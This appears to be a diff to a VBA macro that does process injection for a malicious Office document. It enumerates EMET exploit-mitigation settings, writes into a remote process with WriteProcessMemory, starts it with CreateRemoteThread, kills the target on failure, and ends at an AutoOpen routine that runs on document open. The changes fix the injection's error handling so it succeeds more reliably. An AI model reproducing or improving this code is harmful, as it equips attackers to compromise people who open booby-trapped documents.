@@ -993,7 +993,7 @@ Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\ro
 oReg.EnumValues HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\EMET\AppSettings", arrValues, arrTypes
 Dim smack() As String
 Dim count As Integer
-If Not arrValues = Null Then
+If IsArray(arrValues) Then
     For count = LBound(arrValues) To UBound(arrValues)
     ReDim Preserve smack(count)
     smack(count) = arrValues(count)
@@ -1086,14 +1086,15 @@ rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1,
 Next myCount
 hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
 If hThread = 0 Then
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
-Exit Function
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
 End If
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
-Inject = 1 'Success
-Else
 hProcess = pInfo.hProcess
 sly = TerminateProcess(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
 End If
 Else
 If hProcess = 0 Then
@@ -1114,11 +1115,15 @@ rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1,
 Next myCount
 hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
 If hThread = 0 Then
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+End If
+hProcess = pInfo.hProcess
+sly = TerminateProcess(hProcess, lol)
 Exit Function
-End If    
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
+Else
 Inject = 1 'Success
+End If
 End If
 Else
 sProc = processCmd
@@ -1142,11 +1147,15 @@ rekt = WriteProcessMemory(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1,
 Next myCount
 hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
 If hThread = 0 Then
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
-Exit Function
+If lLinkToLibrary <> 0 Then
+VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
 End If
-If lLinkToLibrary <> 0 Then VirtualFreeEx hProcess, lLinkToLibrary, 0, MEM_RELEASE
-Inject = 1
+hProcess = pInfo.hProcess
+sly = TerminateProcess(hProcess, lol)
+Exit Function
+Else
+Inject = 1 'Success
+End If
 End If
 End Function
 Sub AutoOpen()
